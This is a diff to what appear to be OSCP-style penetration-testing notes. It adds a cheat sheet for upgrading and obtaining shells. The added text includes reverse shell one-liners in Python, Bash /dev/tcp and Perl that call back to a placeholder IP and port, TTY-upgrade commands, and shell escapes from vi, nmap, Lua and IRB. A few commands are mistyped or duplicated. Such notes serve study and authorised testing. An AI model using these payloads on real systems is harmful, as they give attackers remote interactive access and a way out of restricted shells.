@@ -107,11 +107,59 @@ Images
 check python version used in box
 `which python python2 python3`
 
-- Method 1: using Python
-`python -c 'import pty;pty.spawn("/bin/bash")'; #spawn a python psuedo-shell`
+Method 1: using Python
+- `python -c 'import pty;pty.spawn("/bin/bash")'`
+- `python3- c 'import pty;pty.spawn("/bin/sh")'`
+- `stty raw -echo`
 
-- Method 2: Using Script
-`script -qc /bin/bash /dev/nullscript -qc /bin/bash /dev/null`
+Method 2: Using Script
+- `script -qc /bin/bash /dev/nullscript -qc /bin/bash /dev/null`
+
+## references
+## upgrade shell
+- https://fareedfauzi.gitbook.io/oscp-playbook/reverse-shell/interactive-ttys-shell
+- https://github.com/pythonmaster41/Go-For-OSCP
+- https://www.schtech.co.uk/linux-reverse-shell-without-python/
+- https://github.com/RoqueNight/Reverse-Shell-TTY-Cheat-Sheet
+
+```bash
+#Python
+python -c 'import pty; pty.spawn("/bin/sh")'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<[IP]>",<[PORT]>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+
+#non python shell (not 100%)
+#This will break you out of the pseudo terminal and into a tty shell, you can then su and carry out all other terminal based commands
+/usr/bin/script -qc /bin/bash /dev/null
+stty raw -echo; fg; reset
+
+#Bash
+echo os.system('/bin/bash')
+/bin/sh -i
+exec 5<>/dev/tcp/<[IP]>/<[PORT]> cat <&5 | while read line; do $line 2>&5 >&5; done
+
+#Perl
+perl —e 'exec "/bin/sh";'
+perl: exec "/bin/sh";
+perl -e 'use Socket;$i="<[IP]>";$p=<[PORT]>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+#Ruby:
+ruby: exec "/bin/sh"
+
+#Lua
+lua: os.execute('/bin/sh')
+
+#From within IRB
+exec "/bin/sh"
+
+#From within vi
+:!bash
+
+#From within vi
+:set shell=/bin/bash:shell
+
+#From within nmap
+!sh
+```
 
 # Upgrade Windows Shell
 `rlwrap nc -lvnp $port`
